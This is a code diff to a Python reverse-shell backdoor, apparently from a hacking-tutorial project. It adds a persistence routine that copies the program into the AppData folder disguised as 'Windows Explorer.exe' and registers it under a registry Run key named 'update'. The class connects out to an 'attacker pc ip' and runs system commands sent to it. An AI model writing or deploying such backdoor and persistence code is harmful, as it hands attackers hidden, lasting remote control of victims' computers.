@@ -5,12 +5,20 @@ import json
 import os
 import base64
 import sys
+import shutil
 
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port)) # attacker pc ip
+
+    def become_persistent(self):
+        evil_file_location = os.environ("appdata") + "\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call('REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)  # windowsの起動時の実行ファイルを読むdir
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -24,7 +32,6 @@ class Backdoor:
                 return json.loads(json_data)
             except ValueError:
                 continue
-
 
     def execute_system_command(self, command):
         DEVNULL = open(os.devnull, 'wb')
